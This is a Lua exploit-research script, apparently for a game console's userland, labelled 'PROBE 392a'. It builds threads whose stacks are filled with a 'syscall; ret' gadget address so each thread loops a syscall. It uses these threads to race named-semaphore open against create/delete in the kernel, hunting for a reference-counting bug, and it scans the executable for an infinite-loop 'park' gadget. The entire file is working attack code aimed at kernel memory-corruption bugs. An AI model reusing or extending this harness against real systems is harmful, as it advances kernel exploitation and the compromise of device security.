-- CRASH_CLASS: HIGH
-- PROBE 392a: a child thread that loops a syscall, racing the osem registry
--
-- Every previous thread experiment made exactly one syscall: 159a proved a child
-- carries RAX and the argument registers into the loader's `syscall; ret` gadget.
-- But that gadget returns to the address on the stack, and the stack is ours - so a
-- stack filled with the gadget's own address makes the child loop the SAME syscall
-- for as long as the stack lasts. That turns a thread into a syscall storm.
--
-- Target: the named-semaphore registry. 549 creates a named object, 550 deletes it
-- and 551 opens by name (which the dossier says bumps a refcount and hands back a
-- second handle - 349c measured exactly that with handles 518 and 519). A lookup
-- racing a delete is the classic reference-counting bug, and this is the first
-- harness that can actually race it: children storm 551 on the name while the main
-- thread creates and deletes it.
--
-- Markers name each phase. A panic here is the console, not the script.

print("=== PROBE 392a: THREAD SYSCALL STORM ===")
print("")

local CRASH_GATES = 0x480
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(x) return uint64(string.format("0x%X", x)) end
local function addr_of(o) return sgn(uint64(o)) end

local sc_mmap  = make_syscall(477)
local sc_thr   = make_syscall(430)
local sc_osem  = make_syscall(549)
local sc_open  = make_syscall(551)
local sc_del   = make_syscall(550)
local sc_info  = make_syscall(593)
local sc_kill  = make_syscall(431)

-- where the loader's `syscall; ret` gadget lives
-- 159a established that the loader exposes the wrapper here; the gadget is
-- `mov r10, rcx; syscall; ret`, so returning into it repeats the same call.
local gadget = syscall.syscall_address
print(string.format("syscall gadget=0x%X", to_num(gadget)))

-- eboot text base, for the park gadget
local info = memory.alloc(0x200)
pcall(function() memory.write_dword(info, 0x160) end)
local rv = -1
pcall(function() rv = sgn(sc_info(uint64(0), uint64(info), uint64(0), uint64(0), uint64(0), uint64(0))) end)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
print(string.format("593 rv=%d eboot=0x%X", rv, base))

-- find EB FE in the first 0x40000 bytes
local park = nil
do
    local ok, s = pcall(function() return memory.read_buffer(base, 0x40000) end)
    if ok and type(s) == "string" then
        local i = 1
        while true do
            local a, b = s:byte(i, i + 1)
            if not a then break end
            if a == 0xEB and b == 0xFE then park = base + i - 1 break end
            i = i + 1
        end
    end
end
print(string.format("park gadget=0x%X", park or 0))
if not park or not gadget then print("missing gadget") print("=== 392a DONE ===") return end

local function zero(addr, n) for i = 0, n - 4, 4 do pcall(function() memory.write_dword(addr + i, 0) end) end end

-- the name every child looks up
local name = memory.alloc(0x40)
zero(name, 0x40)
local NAME = "omp392a"
pcall(function() for i = 1, #NAME do memory.write_byte(name + i - 1, NAME:byte(i)) end end)
local namep = addr_of(name)

-- A child stack filled with the syscall gadget, parked at the top.
local function build_thread(rax, rdi, rsi, rdx, label)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    local stack_size = 0x20000
    local stack = sgn(sc_mmap(uint64(0), u64(stack_size), u64(3), u64(0x1002), u64(0xFFFFFFFF), u64(0)))
    if stack <= 0 then print("  " .. label .. " mmap failed") return nil end
    local slots = math.floor(stack_size / 8) - 1
    for i = 0, slots - 1 do pcall(function() memory.write_qword(stack + i * 8, u64(gadget)) end) end
    pcall(function() memory.write_qword(stack + slots * 8, u64(park)) end)
    local rsp = stack + 8
    pcall(function()
        memory.write_qword(ctx + 0x108, u64(CRASH_GATES))
        memory.write_qword(ctx + 0x0d0, u64(0))
        memory.write_qword(ctx + 0x110, u64(0x10000))
        memory.write_qword(ctx + 0x0c0, u64(0x43))
        memory.write_qword(ctx + 0x0e0, u64(gadget))
        memory.write_qword(ctx + 0x0f8, u64(rsp))
        memory.write_qword(ctx + 0x100, u64(0x3b))
        memory.write_qword(ctx + 0x048, u64(rdi))
        memory.write_qword(ctx + 0x050, u64(rsi))
        memory.write_qword(ctx + 0x058, u64(rdx))
        memory.write_qword(ctx + 0x078, u64(rax))
    end)
    local out = memory.alloc(8)
    zero(out, 8)
    local ret = -999
    pcall(function() ret = sgn(sc_thr(uint64(ctx), uint64(out), uint64(0), uint64(0), uint64(0), uint64(0))) end)
    local tid = sgn(uint64(out))
    print(string.format("  %s rax=%d ret=%d tid=0x%X", label, rax, ret, tid))
    return tid
end

print("[A] create children storming 551(name)")
local tids = {}
local tb = memory.alloc(0x100)
zero(tb, 0x100)
for i = 1, 3 do
    local tid = build_thread(551, namep, 0, addr_of(tb), "child" .. i)
    if tid then tids[#tids + 1] = tid end
end

print("[B] main thread: create/delete the same name 200 times")
local created, deleted, anomalies = 0, 0, 0
for i = 1, 200 do
    local h = -1
    pcall(function() h = sgn(sc_osem(uint64(namep), u64(0x100), u64(0), u64(1), u64(0), u64(0))) end)
    if h > 0 then
        created = created + 1
        local d = -999
        pcall(function() d = sgn(sc_del(u64(h), u64(0), u64(0), u64(0), u64(0), u64(0))) end)
        if d == 0 then deleted = deleted + 1 end
        if d ~= 0 then anomalies = anomalies + 1 end
    end
    if i % 50 == 0 then
        print(string.format("  round %d created=%d deleted=%d anomalies=%d", i, created, deleted, anomalies))
    end
end

print(string.format("[C] created=%d deleted=%d anomalies=%d", created, deleted, anomalies))
for i, tid in ipairs(tids) do
    local kr = -999
    pcall(function() kr = sgn(sc_kill(u64(tid), u64(0), u64(0), u64(0), u64(0), u64(0))) end)
    print(string.format("  thr_kill(0x%X)=%d", tid, kr))
end
print("still alive")
print("")
print("=== 392a DONE ===")
